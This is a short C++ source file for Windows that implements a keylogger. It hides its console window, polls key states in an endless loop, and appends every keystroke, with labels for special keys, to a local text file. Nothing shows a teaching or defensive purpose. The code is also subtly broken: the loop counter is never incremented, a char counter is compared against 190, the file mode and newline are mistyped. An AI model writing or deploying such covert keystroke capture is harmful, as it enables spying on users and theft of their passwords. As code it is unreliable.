#include <iostream>
using namespace std;
#pragma warning(disable:4996)
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winuser.h>

void Stealth() {
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

int SaveLogs(int key_stroke, const char* file) {
    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;
    FILE* fajl;
    fajl = fopen(file, "a ");
    cout << key_stroke << endl;
    if (key_stroke == 8)
        fprintf(fajl, " %s ", "[BACKSPACE]");
    else if (key_stroke == 13)
        fprintf(fajl, " %s ", "n");
    else if (key_stroke == 32)
        fprintf(fajl, " %s ", " ");
    else if (key_stroke == VK_TAB)
        fprintf(fajl, " %s ", "[TAB]");
    else if (key_stroke == VK_SHIFT)
        fprintf(fajl, " %s ", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
        fprintf(fajl, " %s ", "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(fajl, " %s ", "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(fajl, " %s ", "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(fajl, " %s ", "[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(fajl, " %s ", "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(fajl, " %s ", "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(fajl, " %s ", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(fajl, " %s ", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(fajl, " %s ", ".");
    else
        fprintf(fajl, " %s ", &key_stroke);
    fclose(fajl);
    return 0;
}

int main() {
    Stealth();
    char i;
    while (1) {
        for (i = 8; i <= 190; i) {
            if (GetAsyncKeyState(i) == -32767)
                SaveLogs(i, "keyloggs.txt");
        }
    }
    return 0;
}